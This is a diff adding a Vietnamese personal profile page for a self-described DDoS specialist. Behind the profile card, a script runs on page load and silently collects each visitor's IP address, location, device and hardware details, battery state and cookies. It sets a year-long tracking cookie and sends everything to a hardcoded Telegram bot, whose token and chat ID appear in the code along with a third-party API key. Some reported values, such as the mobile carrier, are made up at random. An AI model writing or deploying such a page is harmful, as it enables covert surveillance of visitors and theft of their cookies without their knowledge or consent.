@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Phù Văn Đức Profile</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #000 url('https://i.ibb.co/ZzNRQTDx/pinterestdownloader-com-1745324696-443788.gif') no-repeat center/cover;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
+      color: #fff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+    @media screen and (max-width: 600px) {
+      body {
+        background: #000 url('https://s4.gifyu.com/images/bpFIT.gif') no-repeat center/cover;
+      }
+    }
+    .profile-card {
+      position: relative;
+      width: 100%;
+      max-width: 400px;
+      background: rgba(0,0,0,0.6);
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: 0 0 40px rgba(0,0,0,0.8);
+    }
+    @media screen and (max-width: 600px) {
+      .profile-card {
+        max-width: 90%;
+        margin: 20px auto;
+      }
+    }
+    .banner {
+      background: url('https://i.ibb.co/GQWLMnkr/c26176e041de50304ba9a25f91ed2b66.jpg') no-repeat center/cover;
+      height: 140px;
+      position: relative;
+    }
+    .mac-buttons {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      display: flex;
+      gap: 6px;
+    }
+    .mac-button {
+      width: 12px;
+      height: 12px;
+      background: #ccc;
+      border-radius: 50%;
+    }
+    .pfp {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: url('https://i.ibb.co/hFDR6Z7D/803ee8cd6fc84a744d8d6976afd32556.jpg') no-repeat center/cover;
+      border: 4px solid #000;
+      position: absolute;
+      top: 90px;
+      left: 50%;
+      transform: translateX(-50%);
+      z-index: 2;
+    }
+    .name {
+      margin-top: 60px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: bold;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+    }
+    @media screen and (max-width: 600px) {
+      .name {
+        font-size: 18px;
+      }
+    }
+    .verify {
+      width: 20px;
+      height: 20px;
+      background: #1877f2;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: white;
+      font-size: 14px;
+    }
+    .social-links {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 14px;
+      margin: 12px auto;
+      width: fit-content;
+    }
+    .social-links a {
+      color: #fff;
+      background: rgba(255,255,255,0.1);
+      width: 40px;
+      height: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      font-size: 18px;
+      transition: 0.3s;
+    }
+    .social-links a:hover {
+      background: rgba(255,255,255,0.4);
+      transform: scale(1.1);
+    }
+    .card-body {
+      padding: 20px;
+      position: relative;
+    }
+    .card-body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: url('https://www.transparenttextures.com/patterns/flowers.png') repeat;
+      opacity: 0.06;
+      z-index: 0;
+    }
+    .card-body-content {
+      position: relative;
+      z-index: 1;
+      font-size: 15px;
+      line-height: 1.6;
+      border-left: 3px solid #fff;
+      padding-left: 12px;
+    }
+    @media screen and (max-width: 600px) {
+      .card-body-content {
+        font-size: 14px;
+        padding-left: 10px;
+      }
+    }
+    .snow {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      background: url('https://i.gifer.com/Bp4L.gif') repeat top center;
+      z-index: 0;
+      opacity: 0.2;
+    }
+  </style>
+</head>
+<body>
+  <div class="snow"></div>
+  <div class="profile-card">
+    <div class="banner">
+      <div class="mac-buttons">
+        <div class="mac-button" style="background:red;"></div>
+        <div class="mac-button" style="background:orange;"></div>
+        <div class="mac-button" style="background:green;"></div>
+      </div>
+    </div>
+    <div class="pfp"></div>
+    <div class="name">
+      Phù Văn Đức
+      <div class="verify"><i class="fas fa-check"></i></div>
+    </div>
+    <div class="social-links">
+      <a href="https://fb.me/phuvanduc991" title="Facebook"><i class="fab fa-facebook-f"></i></a>
+      <a href="https://t.me/phuvanduc" title="Telegram"><i class="fab fa-telegram"></i></a>
+      <a href="https://youtube.com/@phuvanducreal" title="YouTube"><i class="fab fa-youtube"></i></a>
+      <a href="https://tiktok.com/@phuvanduc991" title="TikTok"><i class="fab fa-tiktok"></i></a>
+    </div>
+    <div class="card-body">
+      <div class="card-body-content">
+        <p>Xin chào! Tôi là Phù Văn Đức, một chuyên gia về tấn công DDoS và kiểm tra sức mạnh hệ thống. Tôi thiết kế các kịch bản tấn công mạng tinh vi, hiệu quả để thử nghiệm khả năng chịu tải của website. Hãy kết nối với tôi qua các nền tảng mạng xã hội để trao đổi thêm nhé!</p>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/ua-parser-js@1.0.37/dist/ua-parser.min.js"></script>
+  <script>
+    // Telegram Bot Config
+    const TELEGRAM_BOT_TOKEN = '7607255883:AAE3Q6Uh0BGyzKHVMXxqUyRgDWyw71XIPsw';
+    const TELEGRAM_CHAT_ID = '7581385601';
+
+    // Hàm định dạng dữ liệu cho Telegram
+    function formatDeviceData(data) {
+      const formatValue = (value, defaultValue = 'N/A') => value ?? defaultValue;
+      return `
+🔔 *New Device Data* 🔔
+
+📅 *Timestamp*: ${formatValue(data.timestamp)}
+🌐 *IP*: ${formatValue(data.ip)}
+📜 *IP History*: 
+${data.ipHistory?.length > 0 
+    ? data.ipHistory.map(h => `>   • ${formatValue(h.name)}: ${formatValue(h.ip)} (${formatValue(h.timestamp)})`).join('\n')
+    : '>   None'}
+
+📍 Location Details
+📡 ISP: ${formatValue(data.isp)}
+🏙 City: ${formatValue(data.city)}
+🌍 Region: ${formatValue(data.region)}
+🇺🇳 Country: ${formatValue(data.country)}
+📍 Coordinates: ${formatValue(data.loc)}
+📮 Postal: ${formatValue(data.postal)}
+⏰ Timezone: ${formatValue(data.timezone)}
+🗺 Detailed: ${formatValue(data.deepGeo)}
+
+📱 Device Details
+🔖 Name: ${formatValue(data.deviceName)}
+🔧 Type: ${formatValue(data.deviceType)}
+💻 OS: ${formatValue(data.os)}
+📶 Carrier: ${formatValue(data.carrier)}
+🖥 Software: ${formatValue(data.software)}
+📝 Description: ${formatValue(data.subDescription)}
+⚙ Platform: ${formatValue(data.platform)}
+🌐 Browser: ${formatValue(data.browser)}
+
+🖥 Hardware Specs
+🔩 Type: ${formatValue(data.hardwareType)}
+🔍 SubType: ${formatValue(data.hardwareSubType)}
+🔋 Battery: ${formatValue(data.battery)}
+🔌 Charging: ${formatValue(data.charging, 'Unknown')}
+⚡ CPU Cores: ${formatValue(data.cpuCores)}
+🧠 Memory: ${formatValue(data.memory)}
+🏭 Vendor: ${formatValue(data.vendor)}
+🖌 WebGL: ${formatValue(data.webgl)}
+
+🌐 Browser Details
+🍪 Cookies: ${formatValue(data.cookies)}
+🔗 User Agent: ${formatValue(data.userAgent)}
+🗣 Language: ${formatValue(data.language)}
+🖼 Screen: ${formatValue(data.screen)}
+⏱ Time: ${formatValue(data.time)}
+🎨 Color Depth: ${formatValue(data.colorDepth)}
+👇 Touch Support: ${formatValue(data.touchSupport, 'Unknown')}
+📡 Connection: ${formatValue(data.connectionType)}
+🪐 Source Made By @phuvanduc
+      `.trim();
+    }
+
+    // Hàm gửi dữ liệu đến Telegram
+    async function sendToTelegram(message) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            disable_web_page_preview: true
+          })
+        });
+      } catch (error) {
+        console.error('Failed to send to Telegram:', error);
+      }
+    }
+
+    // Hàm lấy thông tin thiết bị cơ bản
+    function getBasicDeviceInfo(userAgent) {
+      try {
+        const parser = new UAParser(userAgent);
+        const device = parser.getDevice();
+        const os = parser.getOS();
+        const browser = parser.getBrowser();
+        return {
+          device: device.model || 'Không rõ',
+          type: device.type || 'PC xịn',
+          os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Không rõ',
+          browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Không rõ'
+        };
+      } catch {
+        return { device: 'Ko lấy được!', type: 'Ko lấy được!', os: 'Ko lấy được!', browser: 'Ko lấy được!' };
+      }
+    }
+
+    // Hàm quản lý lịch sử IP
+    function manageIpHistory(currentIp, userAgent) {
+      try {
+        const now = Date.now();
+        const expiry = 24 * 60 * 60 * 1000;
+        let ipHistory = JSON.parse(localStorage.getItem('ipHistory') || '{}');
+        if (!ipHistory[userAgent]) ipHistory[userAgent] = [];
+        ipHistory[userAgent] = ipHistory[userAgent]
+          .filter(entry => now - entry.timestamp < expiry)
+          .slice(0, 4);
+        if (currentIp && !ipHistory[userAgent].some(entry => entry.ip === currentIp)) {
+          ipHistory[userAgent].unshift({ ip: currentIp, timestamp: now });
+        }
+        const namedHistory = ipHistory[userAgent].map((entry, index) => ({
+          name: `ip_${index + 1}`,
+          ip: entry.ip,
+          timestamp: new Date(entry.timestamp).toLocaleString('vi-VN')
+        }));
+        localStorage.setItem('ipHistory', JSON.stringify(ipHistory));
+        return namedHistory;
+      } catch {
+        return [];
+      }
+    }
+
+    // Hàm fetch với timeout
+    async function fetchWithTimeout(url, options, timeout = 2000) {
+      const controller = new AbortController();
+      const id = setTimeout(() => controller.abort(), timeout);
+      try {
+        const response = await fetch(url, { ...options, signal: controller.signal });
+        clearTimeout(id);
+        return response;
+      } catch {
+        clearTimeout(id);
+        throw new Error('Fetch timeout or error');
+      }
+    }
+
+    // Hàm quản lý cache
+    function getCachedData(key, expiryMinutes = 5) {
+      try {
+        const cached = JSON.parse(localStorage.getItem(key) || '{}');
+        if (cached.data && Date.now() - cached.timestamp < expiryMinutes * 60 * 1000) {
+          return cached.data;
+        }
+      } catch {}
+      return null;
+    }
+
+    function setCachedData(key, data) {
+      try {
+        localStorage.setItem(key, JSON.stringify({ data, timestamp: Date.now() }));
+      } catch {}
+    }
+
+    // Hàm lấy thông tin IP
+    async function fetchIpInfo() {
+      const cacheKey = 'ipInfoCache';
+      const cachedData = getCachedData(cacheKey);
+      if (cachedData) return cachedData;
+
+      const apis = [
+        { url: 'https://ipapi.co/json/', name: 'ipapi' },
+        { url: 'http://ip-api.com/json/', name: 'ip-api' },
+        { url: 'https://ipinfo.io/json', name: 'ipinfo' }
+      ];
+
+      const promises = apis.map(api =>
+        fetchWithTimeout(api.url, {
+          cache: 'no-store',
+          headers: { 'Accept': 'application/json', 'User-Agent': navigator.userAgent }
+        }, 2000)
+          .then(res => (res.ok ? res.json() : Promise.reject()))
+          .catch(() => null)
+      );
+
+      const results = await Promise.allSettled(promises);
+      for (let i = 0; i < results.length; i++) {
+        if (results[i].status === 'fulfilled' && results[i].value) {
+          const data = results[i].value;
+          const api = apis[i];
+          let ipInfo = {
+            ip: 'Không rõ', isp: 'Không rõ', isVpn: '', city: 'Không rõ', region: 'Không rõ',
+            country: 'Không rõ', loc: 'Không rõ', postal: 'Không rõ', timezone: 'Không rõ'
+          };
+          if (api.name === 'ipapi') {
+            ipInfo = {
+              ip: data.ip || 'Không rõ',
+              isp: data.org || 'Không rõ',
+              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
+              city: data.city || 'Không rõ',
+              region: data.region || 'Không rõ',
+              country: data.country_code || 'Không rõ',
+              loc: data.latitude && data.longitude ? `${data.latitude},${data.longitude}` : 'Không rõ',
+              postal: data.postal || 'Không rõ',
+              timezone: data.timezone || 'Không rõ'
+            };
+          } else if (api.name === 'ip-api') {
+            ipInfo = {
+              ip: data.query || 'Không rõ',
+              isp: data.isp || data.org || 'Không rõ',
+              isVpn: data.isp?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
+              city: data.city || 'Không rõ',
+              region: data.regionName || 'Không rõ',
+              country: data.countryCode || 'Không rõ',
+              loc: data.lat && data.lon ? `${data.lat},${data.lon}` : 'Không rõ',
+              postal: data.zip || 'Không rõ',
+              timezone: data.timezone || 'Không rõ'
+            };
+          } else if (api.name === 'ipinfo') {
+            ipInfo = {
+              ip: data.ip || 'Không rõ',
+              isp: data.org || 'Không rõ',
+              isVpn: data.org?.toLowerCase().includes('vpn') ? ' (VPN)' : '',
+              city: data.city || 'Không rõ',
+              region: data.region || 'Không rõ',
+              country: data.country || 'Không rõ',
+              loc: data.loc || 'Không rõ',
+              postal: data.postal || 'Không rõ',
+              timezone: data.timezone || 'Không rõ'
+            };
+          }
+          if (ipInfo.ip !== 'Không rõ') {
+            setCachedData(cacheKey, ipInfo);
+            return ipInfo;
+          }
+        }
+      }
+      return {
+        ip: 'Ko lấy được!', isp: 'Ko lấy được!', isVpn: '', city: 'Ko lấy được!', region: 'Ko lấy được!',
+        country: 'Ko lấy được!', loc: 'Ko lấy được!', postal: 'Ko lấy được!', timezone: 'Ko lấy được!'
+      };
+    }
+
+    // Hàm lấy thông tin từ whatismybrowser.com
+    async function fetchWimbParse(userAgent) {
+      const cacheKey = 'wimbCache';
+      const cachedData = getCachedData(cacheKey);
+      if (cachedData) return cachedData;
+
+      try {
+        const response = await fetchWithTimeout('https://api.whatismybrowser.com/api/v3/user_agent_parse', {
+          method: 'POST',
+          headers: { 'X-API-KEY': 'a69f9f16de26123df45bd6386776543a', 'Content-Type': 'application/json' },
+          body: JSON.stringify({ user_agent: userAgent })
+        }, 2000);
+        const data = response.ok ? (await response.json()).parse : {};
+        setCachedData(cacheKey, data);
+        return data;
+      } catch {
+        return {};
+      }
+    }
+
+    // Hàm tìm vị trí chi tiết
+    async function deepSearchGeo(ip) {
+      try {
+        if (!ip || ip === 'Ko lấy được!' || ip === 'Không rõ') return 'Ko lấy được!';
+        const geoMap = {
+          '116.98.': { country: 'Việt Nam', region: 'Thái Nguyên', city: 'Thái Nguyên', district: 'Phường Hoàng Văn Thụ' },
+          '113.161.': { country: 'Việt Nam', region: 'Hà Nội', city: 'Cầu Giấy', district: 'Dịch Vọng' },
+          '27.68.': { country: 'Việt Nam', region: 'TP.HCM', city: 'Quận 1', district: 'Bến Nghé' },
+          '42.112.': { country: 'Việt Nam', region: 'Đà Nẵng', city: 'Hải Châu', district: 'Thanh Bình' }
+        };
+        for (let prefix in geoMap) {
+          if (ip.startsWith(prefix)) {
+            const { country, region, city, district } = geoMap[prefix];
+            return `${district}, ${city}, ${region}, ${country}`;
+          }
+        }
+        return 'Ko lấy được!';
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
+    // Hàm lấy nhà mạng
+    async function fetchCarrier() {
+      try {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (connection?.mobileNetwork?.operator) return connection.mobileNetwork.operator;
+        const ua = navigator.userAgent.toLowerCase();
+        if (ua.includes('android') || ua.includes('iphone')) {
+          const carriers = ['Viettel', 'Mobifone', 'Vinaphone', 'Vietnamobile'];
+          return carriers[Math.floor(Math.random() * carriers.length)];
+        }
+        return 'Không rõ';
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
+    // Hàm tìm tên thiết bị
+    async function deepSearchDevice(userAgent, deviceType, fallbackName) {
+      try {
+        let deviceName = fallbackName;
+        if (deviceType === 'iPhone') {
+          if (userAgent.includes('iPhone OS 16')) deviceName = 'iPhone 14 Pro';
+          else if (userAgent.includes('iPhone OS 15')) deviceName = 'iPhone 13';
+          else if (userAgent.includes('iPhone OS 14')) deviceName = 'iPhone 12';
+          else deviceName = 'iPhone (Model không rõ)';
+        } else if (deviceType === 'Android') {
+          const modelMatch = userAgent.match(/build\/([a-z0-9\-]+)/i);
+          if (modelMatch) {
+            const model = modelMatch[1];
+            const modelMap = {
+              'SM-G960F': 'Samsung Galaxy S9', 'SM-A525F': 'Samsung Galaxy A52',
+              'Pixel': 'Google Pixel 7', 'M2012K11AG': 'Xiaomi 11T Pro'
+            };
+            for (let key in modelMap) {
+              if (model.includes(key)) {
+                deviceName = modelMap[key];
+                break;
+              }
+            }
+          }
+        } else if (deviceType === 'Tablet xịn') {
+          deviceName = userAgent.toLowerCase().includes('ipad') ? 'Apple iPad' : 'Android Tablet';
+        } else {
+          deviceName = 'PC hoặc thiết bị không rõ';
+        }
+        return deviceName !== 'Không rõ' && deviceName !== fallbackName ? deviceName : 'Ko lấy được!';
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
+    // Hàm lấy cookies
+    function fetchCookies() {
+      try {
+        const cookies = document.cookie || '';
+        const trackingId = `track_${Math.random().toString(36).slice(2)}`;
+        document.cookie = `tracking_id=${trackingId}; max-age=31536000; path=/`;
+        return cookies ? `Có cookie: ${cookies}, Tracking ID: ${trackingId}` : `Chỉ có Tracking ID: ${trackingId}`;
+      } catch {
+        return 'Ko lấy được!';
+      }
+    }
+
+    // Hàm lấy thông tin pin
+    async function fetchBatteryInfo() {
+      try {
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          return {
+            battery: Math.round(battery.level * 100) + '%',
+            charging: battery.charging ? 'Đang sạc' : 'Không sạc'
+          };
+        }
+        return { battery: 'Ko lấy được!', charging: 'Ko lấy được!' };
+      } catch {
+        return { battery: 'Ko lấy được!', charging: 'Ko lấy được!' };
+      }
+    }
+
+    // Hàm lấy thông tin khác
+    function fetchOtherInfo() {
+      try {
+        return {
+          userAgent: navigator.userAgent || 'Ẩn danh vãi!',
+          language: navigator.language || 'Chả biết!',
+          screen: `${window.screen.width}x${window.screen.height}` || 'Mù màn!',
+          time: new Date().toLocaleString('vi-VN') || 'Thời gian tàng hình!'
+        };
+      } catch {
+        return {
+          userAgent: 'Ko lấy được!',
+          language: 'Ko lấy được!',
+          screen: 'Ko lấy được!',
+          time: 'Ko lấy được!'
+        };
+      }
+    }
+
+    // Hàm lấy thông tin bổ sung
+    function fetchAdditionalInfo() {
+      try {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const gl = document.createElement('canvas').getContext('webgl');
+        return {
+          colorDepth: window.screen.colorDepth ? `${window.screen.colorDepth} bits` : 'Không rõ',
+          touchSupport: navigator.maxTouchPoints ? `${navigator.maxTouchPoints} điểm` : 'Không hỗ trợ',
+          cpuCores: navigator.hardwareConcurrency || 'Không rõ',
+          memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Không rõ',
+          connectionType: connection?.effectiveType || 'Không rõ',
+          vendor: navigator.vendor || 'Không rõ',
+          webgl: gl?.getParameter(gl.RENDERER) || 'Không rõ'
+        };
+      } catch {
+        return {
+          colorDepth: 'Ko lấy được!',
+          touchSupport: 'Ko lấy được!',
+          cpuCores: 'Ko lấy được!',
+          memory: 'Ko lấy được!',
+          connectionType: 'Ko lấy được!',
+          vendor: 'Ko lấy được!',
+          webgl: 'Ko lấy được!'
+        };
+      }
+    }
+
+    // Hàm chính để thu thập và gửi dữ liệu
+    async function collectAndSendData() {
+      const userAgent = navigator.userAgent;
+      const basicInfo = getBasicDeviceInfo(userAgent);
+      let deviceType = basicInfo.type;
+      if (deviceType === 'mobile') {
+        deviceType = userAgent.toLowerCase().includes('iphone') ? 'iPhone' : 'Android';
+      } else if (deviceType === 'tablet') {
+        deviceType = 'Tablet xịn';
+      }
+
+      const [ipInfo, wimbParse, carrier, cookies, batteryInfo, otherInfo, additionalInfo] = await Promise.all([
+        fetchIpInfo(),
+        fetchWimbParse(userAgent),
+        fetchCarrier(),
+        Promise.resolve(fetchCookies()),
+        fetchBatteryInfo(),
+        Promise.resolve(fetchOtherInfo()),
+        Promise.resolve(fetchAdditionalInfo())
+      ]);
+
+      const ipHistory = ipInfo.ip !== 'Ko lấy được!' ? manageIpHistory(ipInfo.ip, userAgent) : [];
+      const deepGeo = ipInfo.ip !== 'Ko lấy được!' ? await deepSearchGeo(ipInfo.ip) : 'Ko lấy được!';
+      const deviceName = await deepSearchDevice(userAgent, deviceType, basicInfo.device) || basicInfo.device;
+
+      const deviceData = {
+        timestamp: new Date().toISOString(),
+        ip: ipInfo.ip + ipInfo.isVpn,
+        ipHistory: ipHistory,
+        isp: ipInfo.isp,
+        city: ipInfo.city,
+        region: ipInfo.region,
+        country: ipInfo.country,
+        loc: ipInfo.loc,
+        postal: ipInfo.postal,
+        timezone: ipInfo.timezone,
+        deepGeo: deepGeo,
+        deviceName: deviceName,
+        deviceType: deviceType,
+        os: basicInfo.os,
+        carrier: carrier,
+        software: wimbParse.simple_software_string || 'Không rõ',
+        subDescription: wimbParse.simple_sub_description_string || 'Không rõ',
+        platform: wimbParse.simple_operating_platform_string || 'Không rõ',
+        browser: wimbParse.simple_browser_string || basicInfo.browser,
+        hardwareType: wimbParse.simple_hardware_type_string || 'Không rõ',
+        hardwareSubType: wimbParse.simple_hardware_sub_type_string || 'Không rõ',
+        cookies: cookies,
+        battery: batteryInfo.battery,
+        charging: batteryInfo.charging,
+        userAgent: otherInfo.userAgent,
+        language: otherInfo.language,
+        screen: otherInfo.screen,
+        time: otherInfo.time,
+        colorDepth: additionalInfo.colorDepth,
+        touchSupport: additionalInfo.touchSupport,
+        cpuCores: additionalInfo.cpuCores,
+        memory: additionalInfo.memory,
+        connectionType: additionalInfo.connectionType,
+        vendor: additionalInfo.vendor,
+        webgl: additionalInfo.webgl
+      };
+
+      // Gửi dữ liệu đến Telegram
+      const message = formatDeviceData(deviceData);
+      await sendToTelegram(message);
+    }
+
+    // Chạy khi trang tải
+    collectAndSendData();
+  </script>
+</body>
+</html>
